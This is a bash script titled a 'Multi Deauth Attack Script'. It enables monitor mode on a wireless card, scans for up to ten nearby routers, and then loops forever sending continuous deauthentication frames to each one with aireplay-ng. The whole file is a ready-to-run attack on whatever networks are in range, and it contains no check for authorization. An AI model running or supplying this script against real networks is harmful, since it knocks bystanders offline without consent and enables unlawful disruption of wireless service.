#!/bin/bash

# Multi Deauth Attack Script - Clean Version (No file saves)

interface="wlan0"
mon_interface="${interface}mon"

cleanup() {
    echo "[*] Cleaning up..."
    sudo airmon-ng stop $mon_interface > /dev/null 2>&1
    sudo systemctl start NetworkManager
    exit
}

trap cleanup INT

echo "[*] Enabling monitor mode on $interface..."
sudo airmon-ng start $interface > /dev/null 2>&1

echo "[*] Scanning for nearby routers..."
bssids=($(sudo timeout 10s airodump-ng $mon_interface --output-format csv | grep -a -m 10 ":..:..:..:..:..:.." | awk -F',' '{print $1}' | head -n 10 | sed 's/ //g'))

if [ ${#bssids[@]} -eq 0 ]; then
    echo "[!] No routers found. Exiting."
    cleanup
fi

echo "[*] Found ${#bssids[@]} target(s). Starting deauth attack..."

while true; do
    for bssid in "${bssids[@]}"; do
        channel=$(sudo iwlist $mon_interface scan | grep -A5 "$bssid" | grep "Channel" | awk -F':' '{print $2}' | head -n 1)
        [ -z "$channel" ] && continue

        sudo iwconfig $mon_interface channel $channel
        echo "[*] Deauthing $bssid on channel $channel..."
        sudo aireplay-ng --deauth 0 -a $bssid $mon_interface > /dev/null 2>&1 &
        sleep 3
        sudo pkill aireplay-ng
    done
done
